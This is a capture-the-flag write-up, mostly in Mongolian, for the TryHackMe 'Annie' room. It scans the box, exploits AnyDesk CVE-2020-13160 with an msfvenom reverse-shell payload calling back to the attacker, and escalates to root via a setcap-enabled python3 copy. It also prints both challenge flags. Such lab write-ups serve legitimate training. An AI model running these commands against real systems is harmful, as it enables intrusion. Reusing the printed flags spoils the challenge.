# Annie THM
*** 
Difficulty - Medium

## Description
    Remote access comes in different flavors.

<p align="center">
  <img src="https://github.com/Uz169/F.NS357-Machines-writeup/blob/main/Hacksmarter%20THM%20medium/files/2.png">
</p>

<p align="center">
  <img src="https://github.com/Uz169/F.NS357-Machines-writeup/blob/main/Hacksmarter%20THM%20medium/files/3.png">
</p>

## Solve

<p> default web асаагүй байсан тул Nmap хийж эхлэнэ.  
``└─$ nmap -A -sC -sV -sF 10.10.255.156 ``
</p>

<p> 22 буюу ssh , 7070 tcp - realserver гэх 2 порт асаалттай байсан.</p>

<p> Тиймээс 7070 portын тухай хайхад AnyDesk гэх service асаж байсан </p>

<p align="center">
  <img src="https://github.com/Uz169/F.NS357-Machines-writeup/blob/main/Hacksmarter%20THM%20medium/files/3.png">
</p>

<p> searchsploit оос AnyDesk гэж хайхад CVE-2020-13160 - RCE эмзэг байдал байсан ба
POC нь - https://www.exploit-db.com/exploits/49613 </p>

<p> доорх POC -г ажиллуулахын тулд MSFVenom ашиглан backdoor shell code руу хөрвүүлэн гаргана</p>
``msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.4.49.166 LPORT=6969 -b “\x00\x25\x26” -f python -v shellcode`` 

<p> 6969 port дээр listen хийгээд ажиллуулахад rev shell авна</p>

<p>Ингээд user.txt авахад - ```THM{N0t_Ju5t_ANY_D3sk}``` </p>

<p>

``     find / -perm -04000 -ls 2>/dev/null
``
</p>

гэж хайхад  /sbin/setcap илэрсэн үүнийг нь хайж үзээд privilage escalation хийх арга олсон.

    cp /usr/bin/python3 /home/annie  
    setcap cap_setuid+ep /home/annie/python3
    getcap -r / 2>/dev/null
    ./python3 -c ‘import os; os.setuid(0); os.system(“/bin/bash”)’
эцэст нь root.txt ээ авна
root.txt - THM{0nly_th3m_5.5.2_D3sk}


